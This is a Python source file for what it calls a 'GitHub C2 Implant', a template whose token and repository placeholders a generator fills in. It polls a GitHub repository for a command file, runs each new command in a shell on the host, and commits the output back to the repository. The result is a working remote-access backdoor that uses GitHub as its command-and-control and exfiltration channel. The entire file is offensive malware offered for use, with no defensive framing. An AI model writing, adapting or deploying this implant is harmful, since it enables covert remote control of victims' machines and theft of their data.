#!/usr/bin/env python3
import logging
import requests
import json
import base64
import time
import subprocess
import os

# --- Implant Configuration ---
# These will be replaced by the generator.
GIT_TOKEN = "{GIT_TOKEN}"
REPO_OWNER = "{REPO_OWNER}"
REPO_NAME = "{REPO_NAME}"
CMD_FILE = "cmd.txt"
OUTPUT_FILE = "output.txt"
POLL_INTERVAL = 30 # in seconds

API_BASE_URL = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/"
HEADERS = {
    "Authorization": f"token {GIT_TOKEN}",
    "Accept": "application/vnd.github.v3+json",
}

def get_file_sha(filepath):
    """Gets the SHA hash of a file in the repository."""
    url = API_BASE_URL + filepath
    try:
        response = requests.get(url, headers=HEADERS)
        if response.status_code == 200:
            return response.json()['sha']
    except requests.exceptions.RequestException as e:
        logging.error(f"Error getting SHA for {filepath}: {e}")
    return None

def get_command():
    """Reads the command from the command file."""
    url = API_BASE_URL + CMD_FILE
    try:
        response = requests.get(url, headers=HEADERS)
        if response.status_code == 200:
            content = base64.b64decode(response.json()['content']).decode(errors='ignore')
            return content
    except requests.exceptions.RequestException as e:
        logging.error(f"Error fetching command: {e}")
    return None

def execute_command(command):
    """Executes a shell command."""
    if not command:
        return ""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout if result.stdout else result.stderr
    except Exception as e:
        return str(e)

def send_output(output):
    """Commits the command output to the output file."""
    content = base64.b64encode(output.encode(errors='ignore')).decode()
    sha = get_file_sha(OUTPUT_FILE)

    data = {
        "message": f"Implant: Uploading output ({time.time()})",
        "content": content,
    }
    if sha:
        data["sha"] = sha

    url = API_BASE_URL + OUTPUT_FILE
    try:
        response = requests.put(url, headers=HEADERS, data=json.dumps(data))
        if response.status_code in [200, 201]:
            logging.info("Successfully sent output.")
        else:
            logging.error(f"Failed to send output. Status: {response.status_code}, Response: {response.text}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error sending output: {e}")

def run_implant():
    """
    The main loop for the GitHub C2 implant.
    """
    logging.info("GitHub C2 Implant started.")
    last_command = None

    while True:
        current_command = get_command()
        if current_command and current_command != last_command:
            logging.info(f"Received new command: {current_command}")
            last_command = current_command
            output = execute_command(current_command)
            send_output(output)

        time.sleep(POLL_INTERVAL)

def main():
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    print("Starting GitHub C2 Implant...")
    run_implant()

if __name__ == "__main__":
    main()
